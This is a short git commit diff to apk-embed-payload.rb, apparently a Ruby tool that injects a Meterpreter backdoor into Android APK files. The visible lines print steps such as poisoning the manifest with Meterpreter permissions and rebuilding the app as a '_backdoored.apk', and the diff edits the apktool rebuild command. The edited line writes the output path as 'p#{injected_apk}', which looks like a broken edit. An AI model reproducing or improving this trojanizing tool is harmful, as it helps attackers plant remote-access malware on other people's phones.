af7a94ee4b78e2a4739d1c3302d958c9702a88e8
xC0d3rZ <xc0d3rz@users.noreply.github.com>
2016-08-11 17:05:14 +0300

    Fixing bugs
    fix #4

--- apk-embed-payload.rb
+++ apk-embed-payload.rb
@@ -226,7 +226,7 @@ injected_apk+="_backdoored.apk"
 puts "[8] Poisoning the manifest with meterpreter permissions".yellow + "\n"
 fix_manifest(d_payload,d_original)
 puts "[9] Rebuilding #{apkfile} with meterpreter injection as ".yellow + File.basename(injected_apk)+ "\n"
-`$(pwd)/embed_tools/apktool.sh b -o $(pwd)/#{injected_apk} #{d_original}`
+`$(pwd)/embed_tools/apktool.sh b -o p#{injected_apk} #{d_original}`
 unless (File.readable?(injected_apk))
 puts "[-] Error creating injection APK,If you haven't Android-SDK please install it.".red
 exit(1);
